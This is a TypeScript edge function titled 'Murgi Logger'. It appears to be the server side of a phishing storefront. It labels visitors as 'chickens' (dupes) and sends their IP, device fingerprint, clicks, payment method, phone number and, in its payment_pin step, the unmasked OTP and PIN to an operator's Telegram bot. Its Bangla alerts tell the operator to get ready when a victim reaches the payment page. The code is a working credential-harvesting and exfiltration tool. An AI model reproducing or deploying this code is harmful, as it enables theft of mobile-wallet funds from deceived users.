// deno-lint-ignore-file no-explicit-any
// Murgi Logger Edge Function - sends logs to Telegram using secrets
// Uses CORS and accepts public requests

import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");

// Simple HTML escaping
function escapeHtml(str: unknown) {
  if (str === undefined || str === null) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function br() {
  return "\n";
}

// Helper to mask last 4 digits of number
function maskNumber(num: string): string {
  if (!num) return "N/A";
  const cleaned = String(num).replace(/\s+/g, "");
  return cleaned.length <= 4 ? "****" + cleaned : "****" + cleaned.slice(-4);
}

// Helper to format messages with consistent spacing
function formatMsg(title: string, lines: Array<{key: string, value: string}>) {
  let msg = `🐔 ${title}\n  \n`;
  for (const line of lines) {
    msg += `${line.key} : ${line.value || ""}\n  \n`;
  }
  return msg + "\n  ";
}

// Build message by type with full client info
function buildMessage(type: string, data: any, meta: any) {
  const ip = escapeHtml(data?.ip || meta.ip || "N/A");
  const device = escapeHtml(data?.device || meta.ua || "N/A");
  const screen = escapeHtml(data?.screen || "N/A");
  const timezone = escapeHtml(data?.timezone || "N/A");
  const language = escapeHtml(data?.language || "N/A");
  const mobile = escapeHtml(data?.mobile || "N/A");
  const cookies = escapeHtml(data?.cookies || "N/A");
  const ref = escapeHtml(data?.referrer || meta.referrer || "Direct");
  const cpu = escapeHtml(data?.cpu || "N/A");

  switch (type) {
    case "visit": {
      return formatMsg("মুরগি Platform Visit ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️", [
        { key: "🐔মুরগির IP Address", value: ip },
        { key: "🐔মুরগির Device Info", value: device },
        { key: "🐔মুরগির Screen Resolution", value: screen },
        { key: "🐔মুরগির Timezone", value: timezone },
        { key: "🐔মুরগির Language", value: language },
        { key: "🐔মুরগির Mobile Device", value: mobile },
        { key: "🐔মুরগির Cookies Enabled", value: cookies },
        { key: "🐔মুরগির Referrer", value: ref },
        { key: "🐔মুরগির CPU Cores", value: cpu },
      ]);
    }
    
    case "platform_click": {
      const platform = escapeHtml(data?.platform ?? "Unknown");
      return formatMsg("মুরগি প্লাটফর্ম ক্লিক করেছে ⚠️", [
        { key: "Platform", value: platform },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "service_click": {
      const platform = escapeHtml(data?.platform ?? "N/A");
      const service = escapeHtml(data?.service ?? "N/A");
      return formatMsg("মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️", [
        { key: "Platform", value: platform },
        { key: "Service", value: service },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "order_submit": {
      const platform = escapeHtml(data?.platform ?? "N/A");
      const service = escapeHtml(data?.service ?? "N/A");
      const link = escapeHtml(data?.link ?? "N/A");
      return formatMsg("মুরগি অর্ডার সাবমিট করেছে ✅", [
        { key: "Platform", value: platform },
        { key: "Service", value: service },
        { key: "Link", value: link },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "payment_page": {
      const method = escapeHtml(data?.method ?? "এখনো সিলেক্ট করেনি।");
      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
        { key: "Payment Method", value: method },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "payment_number": {
      const method = escapeHtml(data?.method ?? "N/A");
      const number = escapeHtml(data?.number ?? "N/A");
      const masked = maskNumber(number);
      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
        { key: "Payment Method", value: method },
        { key: "Number", value: masked },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "payment_otp": {
      const method = escapeHtml(data?.method ?? "N/A");
      const number = escapeHtml(data?.number ?? "N/A");
      const masked = maskNumber(number);
      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
        { key: "Payment Method", value: method },
        { key: "Number", value: masked },
        { key: "OTP", value: "NOT CAPTURED" },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    case "payment_pin": {
      const method = escapeHtml(data?.method ?? "N/A");
      const number = escapeHtml(data?.number ?? "N/A");
      const otp = escapeHtml(data?.otp ?? "N/A");
      const pin = escapeHtml(data?.pin ?? "N/A");
      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
        { key: "Payment Method", value: method },
        { key: "Number", value: number },
        { key: "OTP", value: otp },
        { key: "PIN", value: pin },
        { key: "🐔মুরগির Device", value: device },
        { key: "🐔মুরগির IP", value: ip },
        { key: "🐔মুরগির Referrer", value: ref },
      ]);
    }
    
    default:
      return `Unknown log type: ${escapeHtml(type)}` + br() + `IP: ${ip}`;
  }
}

async function sendToTelegram(text: string) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID secret");
    return new Response(JSON.stringify({ ok: false, error: "Missing secrets" }), {
      headers: { "Content-Type": "application/json", ...corsHeaders },
      status: 500,
    });
  }

  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
  });

  const data = await res.json().catch(() => ({}));
  return new Response(JSON.stringify({ ok: res.ok, data }), {
    headers: { "Content-Type": "application/json", ...corsHeaders },
    status: res.ok ? 200 : 500,
  });
}

Deno.serve(async (req) => {
  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    
    // Support both old format {type, data} and new format {type, payload}
    const type = body.type;
    const data = body.payload || body.data || {};

    // Build meta from headers
    const headers = Object.fromEntries(req.headers.entries());
    const meta = {
      ip: headers["x-forwarded-for"]?.split(",")[0]?.trim() || headers["cf-connecting-ip"] || "",
      referrer: headers["referer"] || headers["origin"] || data?.referrer || "",
      ua: headers["user-agent"] || data?.device || "",
      screen: data?.screen || "",
    };

    const message = buildMessage(String(type || "generic"), data, meta);
    return await sendToTelegram(message);
  } catch (e) {
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      headers: { "Content-Type": "application/json", ...corsHeaders },
      status: 400,
    });
  }
});
